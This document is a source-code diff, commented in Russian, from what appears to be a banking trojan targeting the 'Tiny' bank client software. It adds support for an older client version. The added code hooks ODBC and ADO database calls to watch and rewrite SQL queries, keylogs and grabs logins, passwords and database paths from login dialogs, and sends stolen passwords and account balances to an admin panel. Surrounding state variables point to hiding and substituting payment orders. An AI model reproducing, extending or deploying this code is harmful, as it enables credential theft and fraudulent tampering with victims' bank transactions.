@@ -57,9 +57,12 @@ static HidePayment hidePayments[10]; //скрываемые платежки
 static bool runHideReplacement = false; //true - если надо провести подмену скрытие
 static bool replacementDone = false; //true если подмена была совершена
 
-const int PROCESS_HASH = 0x9530DB12; // tiny.exe
+const DWORD PROCESS_HASH = 0x9530DB12; // tiny.exe
+const DWORD PROCESS_HASH2 = 0x97BB99CB; // cb193w.exe (старая версия клиента)
+
 const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему
 const DWORD HashTPasswordDlg = 0xDF7C7D28; //класс окна ввода пароля
+const DWORD HashTKeyPasswordDlg = 0x8129DC7A; //класс окна ввода пароля к ключу (для старой версии клиента)
 
 char folderTiny[MAX_PATH];
 
@@ -67,6 +70,7 @@ char folderTiny[MAX_PATH];
 DWORD GrabControls[] = { 0x79770896 /* TComboBox */, 0x48B934F1 /* TEdit */, 0 };
 const int MaxFindedControl = 3;
 static char pathMDB[MAX_PATH]; //путь к базе данных
+static DWORD HashCurrProcess = 0; //хеш какого из клиентов
 
 struct ForFindControl
 {
@@ -110,6 +114,8 @@ struct FilterSQLFunc
 
 //запрос счетов, стартует передачу баланса
 static int FSF_SelectAmounts( WCHAR* sql, int len ); 
+//запрос счетов в старом клиенте, смотрим балансы и отсылаем в админку
+static int FSF_SelectAmountsOld( WCHAR* sql, int len ); 
 //после синхронизация обновляется конфиг для установки даты синхронизации, в этот
 //момент нужно запустить подмену
 static int FSF_UpdateConfigLastSync( WCHAR* sql, int len );
@@ -117,6 +123,7 @@ static int FSF_UpdateConfigLastSync( WCHAR* sql, int len );
 FilterSQLFunc filtersSQL[] = 
 {
 { L"select\0amounts\0amountflag\0transflag\0desc\0", 0, FSF_SelectAmounts },
+{ L"select\0amounts\0amountflag\0order\0code\0", 0, FSF_SelectAmountsOld },
 { L"update\0config\0lastsync\0", 0, FSF_UpdateConfigLastSync },
 { 0, 0, 0 }
 };
@@ -170,6 +177,20 @@ static BOOL (WINAPI *RealDestroyWindow)( HWND hWnd );
 static BOOL (WINAPI *RealConnect)( SOCKET s, const struct sockaddr *name, int namelen );
 static BOOL (WINAPI *RealHttpSendRequestA)( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
 static HRESULT (STDAPICALLTYPE *RealCoCreateInstance)( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv );
+//для ODBC с которым старый клиент работает
+static SQLRETURN (WINAPI *RealSQLDriverConnectA)(
+     SQLHDBC         ConnectionHandle,
+     SQLHWND         WindowHandle,
+     SQLCHAR *       InConnectionString,
+     SQLSMALLINT     StringLength1,
+     SQLCHAR *       OutConnectionString,
+     SQLSMALLINT     BufferLength,
+     SQLSMALLINT *   StringLength2Ptr,
+     SQLUSMALLINT    DriverCompletion);
+SQLRETURN (WINAPI *RealSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
+SQLRETURN (WINAPI *RealSQLExecDirectA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
+SQLRETURN (WINAPI *RealSQLExecute)( SQLHSTMT StatementHandle );
+
 //перехват вызова функций в интерфейсах ADO
 static HRESULT (__stdcall *RealConnection_Open)( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options );
 static HRESULT (__stdcall *RealRecordset_Open)( void* This, VARIANT Source, VARIANT ActiveConnection, enum CursorTypeEnum CursorType, enum LockTypeEnum LockType, long Options );
@@ -184,6 +205,11 @@ static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void**
 static DWORD WINAPI ThreadHideReplacement(void*);
 //восстановить баланс и скрываемую платежку
 static void RestoreBalansAndDocs();
+//конвертация счета из базы данных в нормальный вид
+static char* AccountToNormal( const char* from, char* to );
+//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
+//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
+static __int64 SumToInt( const char* s, int* len );
 
 static void CloseDB( ODBC* DB )
 {
@@ -339,6 +365,60 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 	return 0;
 }
 
+//отсылка текущего баланса для старого клиента
+static DWORD WINAPI SendBalanceOld( void* )
+{
+	ODBC* DB = OpenDB();
+	if( DB == 0 ) return 0;
+	char Code[32], Confirmed[32];
+	const char* sql = "select Code,Confirmed from Amounts where Confirmed>0";
+	SQLHSTMT qr = DB->ExecuteSql( sql, "os31 os31", Code, Confirmed );
+	if( qr )
+	{
+		do
+		{
+			char accountA[32];
+			AccountToNormal( Code, accountA );
+			int len = m_lstrlen(accountA);
+			wchar_t* account = AnsiToUnicode(accountA, 0);
+			currAccount = -1;
+			int i = 0;
+			for( i = 0; i < ARRAYSIZE(accountClient) - 1 && accountClient[i].account[0]; i++ )
+			{
+				if( !m_wcsncmp( account, accountClient[i].account, len ) ) //такой счет есть в массиве
+				{
+					currAccount = i;
+					break;
+				}
+			}
+			if( currAccount < 0 ) //в массиве нет такого счета
+			{
+				if( i < ARRAYSIZE(accountClient) - 1 ) //есть еще место в массиве
+				{
+					//добавляем счет
+					m_wcsncpy( accountClient[i].account, account, len + 1 );
+					accountClient[i + 1].account[0] = 0;
+					currAccount = i;
+				}
+			}
+			if( currAccount >= 0 )
+			{
+				__int64 balance =  SumToInt( Confirmed, 0 );
+				if( accountClient[i].balance != balance )
+				{
+					accountClient[i].oldBalance = accountClient[i].balance;
+					accountClient[i].balance = balance;
+					DBG( "Tiny", "account = %ls, balance = %I64d", account, balance );
+					SendBalance(&accountClient[i]);
+				}
+			}
+			MemFree(accountA);
+		} while( DB->NextRow(qr) );
+		DB->CloseQuery(qr);
+	}
+	CloseDB(DB);
+}
+
 static DWORD WINAPI SendPassword( void* )
 {
 	DBG( "Tiny", "Отсылка пароля %s", passwordClient );
@@ -415,13 +495,22 @@ static DWORD SendGrabData( ForFindControl* ffc )
 {
 	TMemory resultGrab(512);
 	resultGrab.AsStr()[0] = 0;
-	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
+	int ilogin = 0;
+	int imdb = 1;
+	//в новом клиента логин находится в 0-м поле, в старом в 1-м, по длине текста
+	//определяем что откуда брать
+	if( m_lstrlen(ffc->texts[0]) > m_lstrlen(ffc->texts[1]) )
+	{
+		ilogin = 1;
+		imdb = 0;
+	}
+	AddStrLog( "Login", ffc->texts[ilogin], resultGrab.AsStr() );
 	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
 	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[2] );
 	RunThread( SendPassword, 0 );
-	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
+	AddStrLog( "Path database", ffc->texts[imdb], resultGrab.AsStr() );
 	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
-	m_lstrcpy( pathMDB, ffc->texts[1] );
+	m_lstrcpy( pathMDB, ffc->texts[imdb] );
 	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
 	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
 	MemFree(ffc);
@@ -502,7 +591,20 @@ static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 		ffc->count = 0;
 		ffc->hashs = GrabControls;
 		pEnumChildWindows( hwnd, EnumChildProc, ffc );
-		if( ffc->count >= 1 )
+		if( ffc->count >= 3 ) //для старого клиента
+			RunThread( SendGrabData, ffc );
+		else
+			if( ffc->count >= 1 ) //для нового клиента
+				RunThread( SendGrabPassword, ffc );
+	}
+	else if ( HashTKeyPasswordDlg == hash ) //может быть только в старом клиенте
+	{
+		DBG( "Tiny", "Закрытие окна ввода пароля для ключей" );
+		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
+		ffc->count = 0;
+		ffc->hashs = GrabControls;
+		pEnumChildWindows( hwnd, EnumChildProc, ffc );
+		if( ffc->count >= 1 ) 
 			RunThread( SendGrabPassword, ffc );
 	}
 
@@ -524,16 +626,6 @@ static BOOL WINAPI HandlerHttpSendRequestA( HINTERNET hRequest, LPCTSTR lpszHead
 		replacementDone = false;
 	}
 	return RealHttpSendRequestA( hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength );
-}
-
-
-static char* ToHex( char* s, const BYTE* p, int c_p )
-{
-	fwsprintfA pwsprintfA = Get_wsprintfA();
-	char* ps= s;
-	for( int i = 0; i < c_p; i++ )
-		ps += pwsprintfA( ps, "%02x", (int)p[i] );
-	return s;
 }
 
 static HRESULT __stdcall HandlerConnection_Open( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options )
@@ -629,6 +721,67 @@ static HRESULT __stdcall HandlerRecordset_Open( void* This, VARIANT Source, VARI
 	return hr;
 }
 
+static int ExecSQLFilter( wchar_t* newSQL )
+{
+	int ret = 0;
+	m_wcslwr(newSQL); //запрос в нижний регистр
+	int i = 0;
+	while( filtersSQL[i].func )
+	{
+		bool ok = true;
+		if( filtersSQL[i].and ) //слова которые должны быть в запросе
+		{
+			int j = 0;
+			const WCHAR* p = newSQL;
+			while( filtersSQL[i].and[j] )
+			{
+				int l = m_wcslen( &filtersSQL[i].and[j] ); //длина очередного слова
+				p = m_wcsstr( p, &filtersSQL[i].and[j] ); //есть слово в запросе
+				if( p == 0 ) //фильтр не сработал
+				{
+					ok = false;
+					break;
+				}
+				p += l;
+				j += l + 1; //переходим на очередное слово
+			}
+		}
+		if( ok && filtersSQL[i].not ) //слова которых не должно быть в запросе
+		{
+			int j = 0;
+			while( filtersSQL[i].not[j] )
+			{
+				int l = m_wcslen( &filtersSQL[i].not[j] );
+				const WCHAR* p = m_wcsstr( newSQL, &filtersSQL[i].not[j] );
+				if( p ) //такое слово есть, фильтр не сработал
+				{
+					ok = false;
+					break;
+				}
+				j += l + 1;
+			}
+		}
+		if( ok ) //фильтр сработал, вызваем его функцию
+		{
+			int len = m_wcslen(newSQL);
+			int res = filtersSQL[i].func( newSQL, len );
+			if( res == 1 ) //оставить запрос как есть
+			{
+				break;
+			}
+			else
+				if( res == 2 ) //подменить запрос
+				{
+					ret = 1;
+					break;
+				}
+			//если res == 0, то поиск продолжается
+		}
+		i++;
+	}
+	return ret;
+}
+
 static HRESULT __stdcall HandlerCommand_put_CommandText( void* This, BSTR pbstr )
 {
 	DBG( "Tiny", "Command_put_CommandText: '%ls'", pbstr );
@@ -640,60 +793,8 @@ static HRESULT __stdcall HandlerCommand_put_CommandText( void* This, BSTR pbstr 
 	{
 		m_wcsncpy( newSQL, pbstr, len );
 		newSQL[len] = 0;
-		m_wcslwr(newSQL); //запрос в нижний регистр
-		int i = 0;
-		while( filtersSQL[i].func )
-		{
-			bool ok = true;
-			if( filtersSQL[i].and ) //слова которые должны быть в запросе
-			{
-				int j = 0;
-				const WCHAR* p = newSQL;
-				while( filtersSQL[i].and[j] )
-				{
-					int l = m_wcslen( &filtersSQL[i].and[j] ); //длина очередного слова
-					p = m_wcsstr( p, &filtersSQL[i].and[j] ); //есть слово в запросе
-					if( p == 0 ) //фильтр не сработал
-					{
-						ok = false;
-						break;
-					}
-					p += l;
-					j += l + 1; //переходим на очередное слово
-				}
-			}
-			if( ok && filtersSQL[i].not ) //слова которых не должно быть в запросе
-			{
-				int j = 0;
-				while( filtersSQL[i].not[j] )
-				{
-					int l = m_wcslen( &filtersSQL[i].not[j] );
-					const WCHAR* p = m_wcsstr( newSQL, &filtersSQL[i].not[j] );
-					if( p ) //такое слово есть, фильтр не сработал
-					{
-						ok = false;
-						break;
-					}
-					j += l + 1;
-				}
-			}
-			if( ok ) //фильтр сработал, вызваем его функцию
-			{
-				int res = filtersSQL[i].func( newSQL, len );
-				if( res == 1 ) //оставить запрос как есть
-				{
-					break;
-				}
-				else
-					if( res == 2 ) //подменить запрос
-					{
-						pbstr = newSQL;
-						break;
-					}
-				//res == 0 - продолжаем поиск
-			}
-			i++;
-		}
+		if( ExecSQLFilter(newSQL) ) //если возвращает 1, то нужно подменить
+			pbstr = newSQL;
 	}
 	HRESULT hr = RealCommand_put_CommandText( This, pbstr );
 	if( newSQL ) MemFree(newSQL);
@@ -768,6 +869,41 @@ static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOW
 	return hr;
 }
 
+static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString,
+					      SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength,
+						  SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion )
+{
+	DBG( "Tiny", "--StringConnect='%s'", InConnectionString );
+	return RealSQLDriverConnectA( ConnectionHandle, WindowHandle, InConnectionString, StringLength1,
+						  OutConnectionString, BufferLength, StringLength2Ptr, DriverCompletion );
+}
+
+static SQLRETURN WINAPI HandlerSQLPrepareA( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength )
+{
+	DBG( "Tiny", "SQLPrepareA: '%s'", StatementText );
+	wchar_t* newSQL = AnsiToUnicode( (char*)StatementText, 0 );
+	char* newASLAnsi = 0;
+	if( newSQL )
+	{
+		if( ExecSQLFilter(newSQL) ) 
+		{
+			newASLAnsi = WSTR::ToAnsi( newSQL, 0 );
+			StatementText = (SQLCHAR*)newASLAnsi;
+		}
+	}
+	SQLRETURN ret = RealSQLPrepareA( StatementHandle, StatementText, TextLength );
+	if( newSQL ) MemFree(newSQL);
+	if( newASLAnsi ) STR::Free(newASLAnsi);
+	return ret;
+}
+
+static SQLRETURN WINAPI HandlerSQLExecDirectA( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength )
+{
+	DBG( "Tiny", "SQLExecDirectA: '%s'", StatementText );
+	return RealSQLExecDirectA( StatementHandle, StatementText, TextLength );
+}
+
+
 
 ///////////////////////////////////////////////////////////////////////////////
 
@@ -788,6 +924,13 @@ void Activeted2(LPVOID Sender)
 bool Init( const char* appName )
 {
 	PKeyLogSystem S = KeyLogger::AddSystem( "tiny", PROCESS_HASH );
+	if( S == 0 ) 
+	{
+		S = KeyLogger::AddSystem( "tiny", PROCESS_HASH2 ); //старый клиент
+		HashCurrProcess = PROCESS_HASH2;
+	}
+	else
+		HashCurrProcess = PROCESS_HASH;
 	if( S != NULL )
 	{
 		DBG( "Tiny", "Регистрация системы" );
@@ -802,12 +945,22 @@ bool Init( const char* appName )
 		{
 			F1->OnActivate = Activeted;
 		}
-		char* classWnd2 = "TPasswordDlg";
+		//в новом клиенте в это окно вводится только пароль
+		//в старом клиенте идет идентификация как в TfAuthNew нового клиента
+		char* classWnd2 = "TPasswordDlg"; 
 		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, classWnd2, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
 		if( F2 )
 		{
 			F2->OnActivate = Activeted2;
 		}
+
+		char* classWnd3 = "TKeyPasswordDlg"; //сработает только в старом клиенте
+		PKlgWndFilter F3 = KeyLogger::AddFilter(S, true, true, classWnd3, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		if( F3 )
+		{
+			F3->OnActivate = Activeted2;
+		}
+
 		RunThread( ThreadHideReplacement, 0 );
 		MegaJump(SendTiny);
 		SetHooks();
@@ -835,9 +988,19 @@ static bool SetHooks()
 
 static bool SetHooks2()
 {
-	if( HookApi( DLL_OLE32, 0x368435BE, &HandlerCoCreateInstance, &RealCoCreateInstance ) )
+	if( HashCurrProcess == PROCESS_HASH ) //новый клиент работает через OleDb
 	{
-		DBG( "Tiny", "установили хук на CoCreateInstance" );
+		if( HookApi( DLL_OLE32, 0x368435BE, &HandlerCoCreateInstance, &RealCoCreateInstance ) )
+			DBG( "Tiny", "установили хук на CoCreateInstance" );
+	}
+	if( HashCurrProcess == PROCESS_HASH2 ) //старый клиент работает через ODBC
+	{
+//		if( HookApi( DLL_ODBC32, 0x3941DBB7, HandlerSQLDriverConnectA, &RealHandlerSQLDriverConnectA ) ) 
+//			DBG( "Tiny", "установили хук на SQLDriverConnectA" );
+		if( HookApi( DLL_ODBC32, 0xC09D6D06, HandlerSQLPrepareA, &RealSQLPrepareA ) ) 
+			DBG( "Tiny", "установили хук на SQLPrepareA" );
+		if( HookApi( DLL_ODBC32, 0xD4667870, HandlerSQLExecDirectA, &RealSQLExecDirectA ) ) 
+			DBG( "Tiny", "установили хук на SQLExecDirectA" );
 	}
 	return true;
 }
@@ -862,6 +1025,13 @@ static int FSF_SelectAmounts( WCHAR* sql, int len )
 {
 	stateSQL = 1; //чтение баланса
 	DBG( "Tiny", "FSF_SelectAmounts(): stateSQL = 1, %ls", sql );
+	return 1; //оставить запрос как есть
+}
+
+static int FSF_SelectAmountsOld( WCHAR* sql, int len )
+{
+	DBG( "Tiny", "FSF_SelectAmountsOld(): запрос баланса, %ls", sql );
+	RunThread( SendBalanceOld, 0 );
 	return 1; //оставить запрос как есть
 }
 
@@ -1044,6 +1214,36 @@ static int ReadString( const char* s, char* buf )
 	return s - p;
 }
 
+//конвертация счета из базы данных в нормальный вид
+static char* AccountToNormal( const char* from, char* to )
+{
+	int space = 0;
+	const char* p = from;
+	char* t = to;
+	while( *p && *p != '.' )
+	{
+		if( *p == ' ' )
+		{
+			if( space == 0 ) 
+			{
+				space = p - from;
+				*t++ = *p;
+			}
+		}
+		else
+			*t++ = *p;
+		p++;
+	}
+	if( space > 0 )
+	{
+		to[space] = p[-1];
+		t--;
+	}
+	while( *p ) *t++ = *p++;
+	*t = 0;
+	return to;
+}
+
 static char* ConvertAccount( const char* from, char* to )
 {
 	const char* sql = "select Code From Amounts";
@@ -1056,30 +1256,7 @@ static char* ConvertAccount( const char* from, char* to )
 		{
 			do
 			{
-				int space = 0;
-				char* p = Code;
-				char* t = to;
-				while( *p && *p != '.' )
-				{
-					if( *p == ' ' )
-					{
-						if( space == 0 ) 
-						{
-							space = p - Code;
-							*t++ = *p;
-						}
-					}
-					else
-						*t++ = *p;
-					p++;
-				}
-				if( space > 0 )
-				{
-					to[space] = p[-1];
-					t--;
-				}
-				while( *p ) *t++ = *p++;
-				*t = 0;
+				AccountToNormal( Code, to );
 				if( m_lstrcmp( from, to ) ==  0 )
 				{
 					m_lstrcpy( to, Code );
